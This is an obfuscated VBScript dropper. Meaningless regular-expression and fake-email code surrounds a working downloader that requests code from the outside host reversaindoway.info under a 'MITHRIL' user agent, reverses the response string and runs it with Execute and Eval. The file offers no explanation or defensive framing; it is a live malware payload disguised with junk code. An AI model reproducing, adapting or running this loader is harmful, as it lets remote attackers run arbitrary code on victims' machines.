QynH6KE = "tLgg5EPhGgls5OBsZQXDufLF7" & "@" & "tLgg5EPhGgls5OBsZQXDufLF7" & "." & "tLgg5EPhGgls5OBsZQXDufLF7"

Set QynH6XY = New RegExp

With QynH6XY
    .Pattern    = "ˆ([\w-]+\.)*[\w-]+@([\w-]+\.)+[a-z]{2,4}$"
    .IgnoreCase = True
    .Global     = False
End With


QynH6XY.Pattern = "ˆ([\w-]+\.)*[\w-]+@([\w-]+)(\.[\w-]+)*\.[a-z]{2,4}$"

Set objMatch = QynH6XY.Execute( QynH6KE )

Set objMatch = Nothing

QynH6XY.Pattern = "@" & QynH6GH
QynH6WT  = "tLgg5EPhGgls5OBsZQXDufLF7"

QynH6CF = QynH6XY.Replace( QynH6KE, "@" & QynH6WT )

Set QynH6XY = Nothing

iWBtw="tLgg5EPhGgls5OBsZQXDufLF7"
URL="http://reversaindoway.info/?c=gg&" & iWBtw
set QynH6=CreateObject("Microsoft.XMLHTTP")

QynH6.open "GET",URL,false
QynH6.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
QynH6.setRequestHeader "User-Agent", "MITHRIL"
QynH6.send "Z"

dim ALuPx

function ALuPxTT()
For i = Len(QynH6.responsetext) to 1  Step-1
var= Mid(QynH6.responsetext,  i  , 1)
ALuPx = ALuPx & var
Next
end function 

execute " Eval(""ALuPxTT()"") : Execute ALuPx & iWBtwQynH6 "
